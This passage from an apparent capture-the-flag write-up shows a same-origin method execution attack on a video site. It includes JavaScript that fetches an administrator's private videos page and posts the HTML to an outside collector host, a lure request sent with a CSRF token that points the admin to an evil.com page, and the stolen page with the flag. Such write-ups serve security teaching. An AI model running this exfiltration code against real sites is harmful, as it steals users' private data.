6. For our own convenience, the Javascript code hidden in the iframe name just loads another javascript file where we can easily develop our real exploit logic
#### 3. The Real Exploit Logic
In our case, we'll just fetch the administrators personal `videos` page and send it to our server:
```javascript
fetch('https://en71jkw9fg9w2.x.pipedream.net/?loaded')
fetch('https://somevideos.appsecil.ctf.today/videos/').then(function (response) {
	// The API call was successful!
	return response.text();
}).then(function (html) {
	// This is the HTML from our response as a text string
	fetch('https://en71jkw9fg9w2.x.pipedream.net/?videos', {
    method: 'post',
    body: html
  })
}).catch(function (err) {
	// There was an error
	fetch('https://en71jkw9fg9w2.x.pipedream.net/?error=' + err)
});
```
#### 4. Luring the Admin
We'll just use the commented-out API that we've seen before:
```javascript
fetch("/videos/listing-request", {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      csrf: 'ELT+o9BwjBfvY4lpXg8SYQzNtlAJP8Fs6POEdTC9ZfA=',
      url: 'http://evil.com/some.html'
    })
  });
```
#### 5. The Reward
After a few seconds, we get a hit on our server with the admin's personal video list:
```html
    SomeVideos
        SomeVideos
            admin
              Your videos
                      Logout
                  Your videos
                Not The Flag
                AppSec-IL{00p5_un3xp3c73d_54m3_0r161n_m37h0d_3x3cu710n}
              View
                Big Buk Bunny
                A large and lovable rabbit deals with three tiny bullies, led by a flying squirrel, who are determined to squelch his happiness.

The flag: `AppSec-IL{00p5_un3xp3c73d_54m3_0r161n_m37h0d_3x3cu710n}`. Really complicated and really cool, right?
